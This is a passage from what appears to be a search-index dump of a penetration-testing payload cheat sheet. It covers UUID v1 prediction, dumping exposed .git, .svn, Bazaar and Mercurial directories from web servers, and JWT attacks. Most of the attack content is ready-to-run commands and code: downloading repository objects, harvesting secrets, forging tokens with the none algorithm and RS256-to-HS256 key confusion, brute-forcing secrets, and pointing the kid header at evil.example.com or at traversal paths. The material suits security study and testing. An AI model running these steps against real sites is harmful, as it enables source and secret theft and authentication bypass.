<code>xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx</code>  The four-bit M and the 1- to 3-bit N fields code the format of the UUID itself.</p> Version Notes 0 Only <code>00000000-0000-0000-0000-000000000000</code> 1 based on time, or clock sequence 2 reserved in the RFC 4122, but ommitted in many implementations 3 based on a MD5 hash 4 randomly generated 5 based on a SHA1 hash"},{"location":"Insecure%20Randomness/#tools","title":"Tools","text":"<ul> <li>intruder-io/guidtool - A tool to inspect and attack version 1 GUIDs     <pre><code>$ guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00\nUUID version: 1\nUUID time: 2022-04-13 08:06:13.202186\nUUID timestamp: 138691299732021860\nUUID node: 91754721024\nUUID MAC address: 00:15:5d:01:ef:00\nUUID clock sequence: 2099\n$ guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000\n</code></pre></li> </ul>"},{"location":"Insecure%20Randomness/#references","title":"References","text":"<ul> <li>In GUID We Trust - Daniel Thatcher - October 11, 2022</li> </ul>"},{"location":"Insecure%20Source%20Code%20Management/","title":"Insecure Source Code Management","text":"<ul> <li>Git</li> <li>Example<ul> <li>Recovering file contents from .git/logs/HEAD</li> <li>Recovering file contents from .git/index</li> </ul> </li> <li>Tools<ul> <li>Automatic recovery</li> <li>git-dumper.py</li> <li>diggit.py</li> <li>GoGitDumper</li> <li>rip-git</li> <li>GitHack</li> <li>GitTools</li> <li>Harvesting secrets</li> <li>trufflehog</li> <li>Yar</li> <li>Gitrob</li> <li>Gitleaks</li> </ul> </li> <li>Subversion</li> <li>Example (Wordpress)</li> <li>Tools<ul> <li>svn-extractor</li> </ul> </li> <li>Bazaar</li> <li>Tools<ul> <li>rip-bzr.pl</li> <li>bzr_dumper</li> </ul> </li> <li>Mercurial</li> <li>Tools<ul> <li>rip-hg.pl</li> </ul> </li> <li>References</li> </ul>"},{"location":"Insecure%20Source%20Code%20Management/#git","title":"Git","text":"<p>The following examples will create either a copy of the .git or a copy of the current commit.</p> <p>Check for the following files, if they exist you can extract the .git folder.</p> <ul> <li>.git/config</li> <li>.git/HEAD</li> <li>.git/logs/HEAD</li> </ul>"},{"location":"Insecure%20Source%20Code%20Management/#example","title":"Example","text":""},{"location":"Insecure%20Source%20Code%20Management/#recovering-file-contents-from-gitlogshead","title":"Recovering file contents from .git/logs/HEAD","text":"<ol> <li>Check for 403 Forbidden or directory listing to find the <code>/.git/</code> directory</li> <li>Git saves all information in <code>.git/logs/HEAD</code> (try lowercase <code>head</code> too)     <pre><code>0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root &lt;root@dfc2eabdf236.(none)&gt; 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git\n15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael &lt;michael@easyctf.com&gt; 1489390329 +0000        commit: Initial.\n26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael &lt;michael@easyctf.com&gt; 1489390330 +0000        commit: Whoops! Remove flag.\n6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael &lt;michael@easyctf.com&gt; 1489390332 +0000        commit: Prevent directory listing.\n</code></pre></li> <li>Access the commit using the hash     <pre><code># create an empty .git repository\ngit init test\ncd test/.git\n# download the file\nwget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c\n# first byte for subdirectory, remaining bytes for filename\nmkdir .git/object/26\nmv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/\n# display the file\ngit cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c\ntree 323240a3983045cdc0dec2e88c1358e7998f2e39\nparent 15ca375e54f056a576905b41a417b413c57df6eb\nauthor Michael &lt;michael@easyctf.com&gt; 1489390329 +0000\ncommitter Michael &lt;michael@easyctf.com&gt; 1489390329 +0000\nInitial.\n</code></pre></li> <li>Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39     <pre><code>wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39\nmkdir .git/object/32\nmv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/\ngit cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39\n040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css\n100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt\n040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts\n100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html\n040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js\n</code></pre></li> <li>Read the data (flag.txt)     <pre><code>wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f\nmkdir .git/object/cb\nmv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/\ngit cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f\n</code></pre></li> </ol>"},{"location":"Insecure%20Source%20Code%20Management/#recovering-file-contents-from-gitindex","title":"Recovering file contents from .git/index","text":"<p>Use the git index file parser https://pypi.python.org/pypi/gin (python3).</p> <pre><code>pip3 install gin\ngin ~/git-repo/.git/index\n</code></pre> <p>Recover name and sha1 hash of every file listed in the index, and use the same process above to recover the file.</p> <pre><code>$ gin .git/index | egrep -e \"name|sha1\" \nname = AWS Amazon Bucket S3/README.md\nsha1 = 862a3e58d138d6809405aa062249487bee074b98\nname = CRLF injection/README.md\nsha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#tools","title":"Tools","text":""},{"location":"Insecure%20Source%20Code%20Management/#automatic-recovery","title":"Automatic recovery","text":""},{"location":"Insecure%20Source%20Code%20Management/#git-dumperpy","title":"git-dumper.py","text":"<pre><code>git clone https://github.com/arthaud/git-dumper\npip install -r requirements.txt\n./git-dumper.py http://web.site/.git ~/website\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#diggitpy","title":"diggit.py","text":"<pre><code>git clone https://github.com/bl4de/security-tools/ &amp;&amp; cd security-tools/diggit\n./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]\n./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1\n-u is remote path, where .git folder exists\n-t is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (cd /path/to/temp/folder &amp;&amp; git init)\n-o is a hash of particular Git object to download\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#gogitdumper","title":"GoGitDumper","text":"<pre><code>go get github.com/c-sto/gogitdumper\ngogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/\ngit log\ngit checkout\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#rip-git","title":"rip-git","text":"<pre><code>git clone https://github.com/kost/dvcs-ripper\nperl rip-git.pl -v -u \"http://web.site/.git/\"\ngit cat-file -p 07603070376d63d911f608120eb4b5489b507692  \ntree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2\nparent 15ca375e54f056a576905b41a417b413c57df6eb\nauthor Michael &lt;michael@easyctf.com&gt; 1489389105 +0000\ncommitter Michael &lt;michael@easyctf.com&gt; 1489389105 +0000\ngit cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#githack","title":"GitHack","text":"<pre><code>git clone https://github.com/lijiejie/GitHack\nGitHack.py http://web.site/.git/\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#gittools","title":"GitTools","text":"<pre><code>git clone https://github.com/internetwache/GitTools\n./gitdumper.sh http://target.tld/.git/ /tmp/destdir\ngit checkout -- .\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#harvesting-secrets","title":"Harvesting secrets","text":""},{"location":"Insecure%20Source%20Code%20Management/#trufflehog","title":"trufflehog","text":"<p>Searches through git repositories for high entropy strings and secrets, digging deep into commit history.</p> <pre><code>pip install truffleHog # https://github.com/dxa4481/truffleHog\ntruffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#yar","title":"Yar","text":"<p>Searches through users/organizations git repositories for secrets either by regex, entropy or both. Inspired by the infamous truffleHog.</p> <pre><code>go get github.com/nielsing/yar # https://github.com/nielsing/yar\nyar -o orgname --both\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#gitrob","title":"Gitrob","text":"<p>Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files.</p> <pre><code>go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob\nexport GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef\ngitrob [options] target [target2] ... [targetN]\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#gitleaks","title":"Gitleaks","text":"<p>Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source code repositories.</p> <pre><code># Run gitleaks against a public repository\ndocker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git\n# Run gitleaks against a local repository already cloned into /tmp/\ndocker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks\n# Run gitleaks against a specific Github Pull request\ndocker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000\nor\ngo get -u github.com/zricethezav/gitleaks\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#subversion","title":"Subversion","text":""},{"location":"Insecure%20Source%20Code%20Management/#example-wordpress","title":"Example (Wordpress)","text":"<pre><code>curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base\n</code></pre> <ol> <li>Download the svn database from http://server/path_to_vulnerable_site/.svn/wc.db     <pre><code>INSERT INTO \"NODES\" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);\n</code></pre></li> <li>Download interesting files<ul> <li>remove \\$sha1\\$ prefix</li> <li>add .svn-base postfix</li> <li>use first byte from hash as a subdirectory of the <code>pristine/</code> directory (<code>94</code> in this case)</li> <li>create complete path, which will be: <code>http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base</code></li> </ul> </li> </ol>"},{"location":"Insecure%20Source%20Code%20Management/#tools_1","title":"Tools","text":""},{"location":"Insecure%20Source%20Code%20Management/#svn-extractor","title":"svn-extractor","text":"<pre><code>git clone https://github.com/anantshri/svn-extractor.git\npython svn-extractor.py \u2013url \"url with .svn available\"\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#bazaar","title":"Bazaar","text":""},{"location":"Insecure%20Source%20Code%20Management/#tools_2","title":"Tools","text":""},{"location":"Insecure%20Source%20Code%20Management/#rip-bzrpl","title":"rip-bzr.pl","text":"<pre><code>wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl\ndocker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#bzr_dumper","title":"bzr_dumper","text":"<pre><code>git clone https://github.com/SeahunOh/bzr_dumper\npython3 dumper.py -u \"http://127.0.0.1:5000/\" -o source\nCreated a standalone tree (format: 2a)                                                                                                                                                       \n[!] Target : http://127.0.0.1:5000/\n[+] Start.\n[+] GET repository/pack-names\n[+] GET README\n[+] GET checkout/dirstate\n[+] GET checkout/views\n[+] GET branch/branch.conf\n[+] GET branch/format\n[+] GET branch/last-revision\n[+] GET branch/tag\n[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'\n[*] Finish\n$ bzr revert\nN  application.py\nN  database.py\nN  static/   \n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#mercurial","title":"Mercurial","text":""},{"location":"Insecure%20Source%20Code%20Management/#tools_3","title":"Tools","text":""},{"location":"Insecure%20Source%20Code%20Management/#rip-hgpl","title":"rip-hg.pl","text":"<pre><code>wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl\ndocker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u\n</code></pre>"},{"location":"Insecure%20Source%20Code%20Management/#references","title":"References","text":"<ul> <li>bl4de, hidden_directories_leaks</li> <li>bl4de, diggit</li> <li>Gitrob: Now in Go - Michael Henriksen</li> </ul>"},{"location":"JSON%20Web%20Token/","title":"JWT - JSON Web Token","text":"<p>JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.</p>"},{"location":"JSON%20Web%20Token/#summary","title":"Summary","text":"<ul> <li>Summary</li> <li>Tools</li> <li>JWT Format</li> <li>Header</li> <li>Payload</li> <li>JWT Signature - None algorithm (CVE-2015-9235)</li> <li>JWT Signature - RS256 to HS256 (CVE-2016-5431)</li> <li>JWT Secret</li> <li>Encode and Decode JWT with the secret</li> <li>Break JWT secret<ul> <li>JWT tool</li> <li>JWT cracker</li> <li>JWT pwn</li> <li>Hashcat</li> </ul> </li> <li>JWT Kid Claim Misuse</li> <li>References</li> </ul>"},{"location":"JSON%20Web%20Token/#tools","title":"Tools","text":"<ul> <li>jwt_tool</li> <li>c-jwt-cracker</li> <li>JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper</li> </ul>"},{"location":"JSON%20Web%20Token/#jwt-format","title":"JWT Format","text":"<p>JSON Web Token : <code>Base64(Header).Base64(Data).Base64(Signature)</code></p> <p>Example : <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY</code></p> <p>Where we can split it into 3 components separated by a dot.</p> <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header\neyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload\nUL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature\n</code></pre>"},{"location":"JSON%20Web%20Token/#header","title":"Header","text":"<p>Registered header parameter names defined in JSON Web Signature (JWS) RFC. The most basic JWT header is the following JSON.</p> <pre><code>{\n\"typ\": \"JWT\",\n\"alg\": \"HS256\"\n}\n</code></pre> <p>Other parameters are registered in the RFC.</p> Parameter Definition Description alg Algorithm Identifies the cryptographic algorithm used to secure the JWS jku JWK Set URL Refers to a resource for a set of JSON-encoded public keys jwk JSON Web Key The public key used to digitally sign the JWS kid Key ID The key used to secure the JWS x5u X.509 URL URL for the X.509 public key certificate or certificate chain x5c X.509 Certificate Chain X.509 public key certificate or certificate chain in PEM-encoded used to digitally sign the JWS x5t X.509 Certificate SHA-1 Thumbprint) Base64 url-encoded SHA-1 thumbprint (digest) of the DER encoding of the X.509 certificate x5t#S256 X.509 Certificate SHA-256 Thumbprint Base64 url-encoded SHA-256 thumbprint (digest) of the DER encoding of the X.509 certificate typ Type Media Type. Usually <code>JWT</code> cty Content Type This header parameter is not recommended to use crit Critical Extensions and/or JWA are being used <p>Default algorithm is \"HS256\" (HMAC SHA256 symmetric encryption). \"RS256\" is used for asymmetric purposes (RSA asymmetric encryption and private key signature).</p> <code>alg</code> Param Value Digital Signature or MAC Algorithm Requirements HS256 HMAC using SHA-256 Required HS384 HMAC using SHA-384 Optional HS512 HMAC using SHA-512 Optional RS256 RSASSA-PKCS1-v1_5 using SHA-256 Recommended RS384 RSASSA-PKCS1-v1_5 using SHA-384 Optional RS512 RSASSA-PKCS1-v1_5 using SHA-512 Optional ES256 ECDSA using P-256 and SHA-256 Recommended ES384 ECDSA using P-384 and SHA-384 Optional ES512 ECDSA using P-521 and SHA-512 Optional PS256 RSASSA-PSS using SHA-256 and MGF1 with SHA-256 Optional PS384 RSASSA-PSS using SHA-384 and MGF1 with SHA-384 Optional PS512 RSASSA-PSS using SHA-512 and MGF1 with SHA-512 Optional none No digital signature or MAC performed Required"},{"location":"JSON%20Web%20Token/#payload","title":"Payload","text":"<pre><code>{\n\"sub\":\"1234567890\",\n\"name\":\"Amazing Haxx0r\",\n\"exp\":\"1466270722\",\n\"admin\":true\n}\n</code></pre> <p>Claims are the predefined keys and their values: - iss: issuer of the token - exp: the expiration timestamp (reject tokens which have expired). Note: as defined in the spec, this must be in seconds. - iat: The time the JWT was issued. Can be used to determine the age of the JWT - nbf: \"not before\" is a future time when the token will become active. - jti: unique identifier for the JWT. Used to prevent the JWT from being re-used or replayed. - sub: subject of the token (rarely used) - aud: audience of the token (also rarely used)</p> <p>JWT Encoder \u2013 Decoder: <code>http://jsonwebtoken.io</code></p>"},{"location":"JSON%20Web%20Token/#jwt-claims","title":"JWT Claims","text":"<p>IANA's JSON Web Token Claims</p>"},{"location":"JSON%20Web%20Token/#jwt-signature-none-algorithm-cve-2015-9235","title":"JWT Signature - None algorithm (CVE-2015-9235)","text":"<p>JWT supports a <code>None</code> algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.</p> <p>None algorithm variants: * none  * None * NONE * nOnE</p> <p>To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT.</p> <p>However, this won't work unless you remove the signature</p> <p>Alternatively you can modify an existing JWT (be careful with the expiration time)</p> <pre><code>import jwt\njwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'\ndecodedToken = jwt.decode(jwtToken, verify=False)                   \n# decode the token before encoding with type 'None'\nnoneEncoded     = jwt.encode(decodedToken, key='', algorithm=None)\nprint(noneEncoded.decode())\n</code></pre>"},{"location":"JSON%20Web%20Token/#jwt-signature-rs256-to-hs256-cve-2016-5431","title":"JWT Signature - RS256 to HS256 (CVE-2016-5431)","text":"<p>Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data.</p> <p>The algorithm HS256 uses the secret key to sign and verify each message. The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.</p> <pre><code>import jwt\npublic = open('public.pem', 'r').read()\nprint public\nprint jwt.encode({\"data\":\"test\"}, key=public, algorithm='HS256')\n</code></pre> <p> This behavior is fixed in the python library and will return this error <code>jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</code>. You need to install the following version: <code>pip install pyjwt==0.4.3</code>.</p> <p>Here are the steps to edit an RS256 JWT token into an HS256</p> <ol> <li> <p>Convert our public key (key.pem) into HEX with this command.</p> <pre><code>$ cat key.pem | xxd -p | tr -d \"\\\\n\"\n2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a\n</code></pre> </li> <li> <p>Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited.</p> <pre><code>$ echo -n \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a\n(stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0\n</code></pre> </li> <li> <p>Convert signature (Hex to \"base64 URL\")</p> <pre><code>$ python2 -c \"exec(\\\"import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\\\")\"\n</code></pre> </li> <li> <p>Add signature to edited payload</p> <pre><code>[HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA\n</code></pre> </li> </ol>"},{"location":"JSON%20Web%20Token/#jwt-secret","title":"JWT Secret","text":"<p>To create a JWT, a secret key is used to sign the header and payload, which generates the signature. The secret key must be kept secret and secure to prevent unauthorized access to the JWT or tampering with its contents. If an attacker is able to access the secret key, they can create, modify or sign their own tokens, bypassing the intended security controls.</p>"},{"location":"JSON%20Web%20Token/#encode-and-decode-jwt-with-the-secret","title":"Encode and Decode JWT with the secret","text":"<p>Using pyjwt: <code>pip install pyjwt</code></p> <pre><code>import jwt\nencoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')\njwt.decode(encoded, 'secret', algorithms=['HS256']) \n</code></pre>"},{"location":"JSON%20Web%20Token/#break-jwt-secret","title":"Break JWT secret","text":"<p>Useful list of 3502 public-available JWT: wallarm/jwt-secrets/jwt.secrets.list, including <code>your_jwt_secret</code>, <code>change_this_super_secret_random_string</code>, etc.</p>"},{"location":"JSON%20Web%20Token/#jwt-tool","title":"JWT tool","text":"<p>First, bruteforce the \"secret\" key used to compute the signature using ticarpi/jwt_tool</p> <pre><code>python3 -m pip install termcolor cprint pycryptodomex requests\npython3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C\n</code></pre> <p>Then edit the field inside the JSON Web Token.</p> <pre><code>Current value of role is: user\nPlease enter new value and hit ENTER\n&gt; admin\n[1] sub = 1234567890\n[2] role = admin\n[3] iat = 1516239022\n[0] Continue to next step\nPlease select a field number (or 0 to Continue):\n&gt; 0\n</code></pre> <p>Finally, finish the token by signing it with the previously retrieved \"secret\" key.</p> <pre><code>Token Signing:\n[1] Sign token with known key\n[2] Strip signature from token vulnerable to CVE-2015-2951\n[3] Sign with Public Key bypass vulnerability\n[4] Sign token with key file\nPlease select an option from above (1-4):\n&gt; 1\nPlease enter the known key:\n&gt; secret\nPlease enter the key length:\n[1] HMAC-SHA256\n[2] HMAC-SHA384\n[3] HMAC-SHA512\n&gt; 1\nYour new forged token:\n[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic\n[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic\n</code></pre> <ul> <li>Recon: <code>python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw</code></li> <li>Scanning: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -M pb</code></li> <li>Exploitation: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -X i -I -pc name -pv admin</code></li> <li>Fuzzing: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -I -hc kid -hv custom_sqli_vectors.txt</code></li> <li>Review: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -X i -I -pc name -pv admin</code></li> </ul>"},{"location":"JSON%20Web%20Token/#jwt-cracker","title":"JWT cracker","text":"<pre><code>git clone https://github.com/brendan-rius/c-jwt-cracker\n./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE\nSecret is \"Sn1f\"\n</code></pre>"},{"location":"JSON%20Web%20Token/#jwt-pwn","title":"jwt-pwn","text":"<pre><code>git clone https://github.com/mazen160/jwt-pwn\npython3 jwt-cracker.py -jwt \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4\" -t 10 -w jwt.secrets.list\n[#] KEY FOUND: 1234\n</code></pre>"},{"location":"JSON%20Web%20Token/#hashcat","title":"Hashcat","text":"<p>Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - src</p> <pre><code>/hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret\n</code></pre>"},{"location":"JSON%20Web%20Token/#jwt-kid-claim-misuse","title":"JWT Kid Claim Misuse","text":"<p>The \"kid\" (key ID) claim in a JSON Web Token (JWT) is an optional header parameter that is used to indicate the identifier of the cryptographic key that was used to sign or encrypt the JWT. It is important to note that the key identifier itself does not provide any security benefits, but rather it enables the recipient to locate the key that is needed to verify the integrity of the JWT.</p> <ul> <li> <p>Example #1 : Local file     <pre><code>{\n\"alg\": \"HS256\",\n\"typ\": \"JWT\",\n\"kid\": \"/root/res/keys/secret.key\"\n}\n</code></pre></p> </li> <li> <p>Example #2 : Remote file     <pre><code>{\n\"alg\":\"RS256\",\n\"typ\":\"JWT\",\n\"kid\":\"http://localhost:7070/privKey.key\"\n}\n</code></pre></p> </li> </ul> <p>The content of the file specified in the kid header will be used to generate the signature.</p> <pre><code>// Example for HS256\nHMACSHA256(\nbase64UrlEncode(header) + \".\" +\nbase64UrlEncode(payload),\nyour-256-bit-secret-from-secret.key\n)\n</code></pre> <p>The common ways to misuse the kid header: * Get the key content to change the payload * Change the key path to force your own     <pre><code>&gt;&gt;&gt; jwt.encode(\n...     {\"some\": \"payload\"},\n...     \"secret\",\n...     algorithm=\"HS256\",\n...     headers={\"kid\": \"http://evil.example.com/custom.key\"},\n... )\n</code></pre></p> <ul> <li> <p>Change the key path to a file with a predictable content.   <pre><code>python3 jwt_tool.py &lt;JWT&gt; -I -hc kid -hv \"../../dev/null\" -S hs256 -p \"\"\npython3 jwt_tool.py &lt;JWT&gt; -I -hc kid -hv \"/proc/sys/kernel/randomize_va_space\" -S hs256 -p \"2\"\n</code></pre></p> </li> <li> <p>Modify the kid header to attempt SQL and Command Injections</p> </li> </ul>"},{"location":"JSON%20Web%20Token/#labs","title":"Labs","text":"<ul> <li>JWT authentication bypass via unverified signature</li> <li>JWT authentication bypass via flawed signature verification</li> <li>JWT authentication bypass via weak signing key</li> <li>JWT authentication bypass via jwk header injection</li> <li>JWT authentication bypass via jku header injection</li> <li>JWT authentication bypass via kid header path traversal</li> </ul>"},{"location":"JSON%20Web%20Token/#references","title":"References","text":"<ul> <li>5 Easy Steps to Understanding JSON Web Token</li> <li>Attacking JWT authentication - Sep 28, 2016 - Sjoerd Langkemper</li> <li>Club EH RM 05 - Intro to JSON Web Token Exploitation - Nishacid</li> <li>Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean</li> <li>Hacking JSON Web Token (JWT) - Hate_401</li> <li>Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog</li> <li>Hacking JSON Web Tokens - medium.com Oct 2019</li> <li>HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng)</li> <li>How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar</li> <li>JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020</li> <li>JSON Web Token Vulnerabilities - 0xn3va</li> <li>JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017</li> 